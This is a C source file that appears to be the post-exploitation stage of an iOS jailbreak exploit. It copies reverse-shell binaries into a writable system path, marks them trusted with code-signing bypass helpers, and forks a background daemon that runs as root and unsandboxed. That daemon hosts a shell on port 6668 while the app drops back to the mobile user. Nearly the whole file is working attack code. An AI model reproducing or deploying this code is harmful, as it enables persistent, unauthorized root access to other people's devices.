//
//  BNSA_exp.c
//  UHAK_final
//
//  Created by aa on 6/1/19.
//  Copyright © 2019 aa. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <copyfile.h>
#include <sys/stat.h>
#include <removefile.h>
#include "inject.h"
#include <ifaddrs.h>
#include <net/if.h>
#include <arpa/inet.h>

#define printf(X,X2...) {}

#define printf_wow(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
void display_ip_address(){
    struct ifaddrs *interfaces = NULL;
    struct ifaddrs *temp_addr = NULL;
    if(getifaddrs(&interfaces) == 0){
        temp_addr = interfaces;
        while(temp_addr != NULL) {
            if(temp_addr->ifa_addr->sa_family == AF_INET) {
                
                printf_wow("    %s: ", temp_addr->ifa_name);
                char *ip_addr = inet_ntoa(((struct sockaddr_in *)temp_addr->ifa_addr)->sin_addr);
                printf_wow("    %s\n", ip_addr);
            }
            temp_addr = temp_addr->ifa_next;
        }
        freeifaddrs(interfaces);
    }else{
        printf("Error: getifaddrs\n");
    }
}

void post_exp_main(){
    
    printf("+++ Post-Exploitation\n");
    
    // All execution files must be under /var/containers/Bundle/, because root filesystem is not writable
    // Also must be outside the /var/containers/Bundle/Application, to be outside container daemon jurisdiction
    
    extern char *reverseShell_path;
    char *new_path = "/var/containers/Bundle/reverseShell101";
    if(access(new_path, F_OK)){
      copyfile(reverseShell_path, new_path, 0, COPYFILE_ALL|COPYFILE_RECURSIVE);
    }
    reverseShell_path = new_path;
    trust_aDirectory(reverseShell_path);
    
    extern char *ios_reverseshell;
    new_path = "/var/containers/Bundle/ios_reverseshell101";
    if(access(new_path, F_OK)){
        copyfile(ios_reverseshell, new_path, 0, COPYFILE_ALL|COPYFILE_RECURSIVE);
    }
    ios_reverseshell = new_path;
    trust_aFile(ios_reverseshell);
    
    display_ip_address();
    printf_wow("    port: %s", "6668");
 
    if(fork() == 0){
        daemon(1, 1); // This is not deprecated, to keep child process alive
        
        // TO DO: Do whatever you want, code here will be running in the background as Root & Unsandboxed.
        
        chmod(ios_reverseshell, 0755);
        
        // Demo: Hosting a reverse Shell
        char *argv[] = {ios_reverseshell, reverseShell_path, "6668", NULL};
        (printf)("execvp failed: %d\n", execvp(ios_reverseshell, argv));
    }
    
    setuid(501); // Set our app back to mobile user, child process will remain root
}
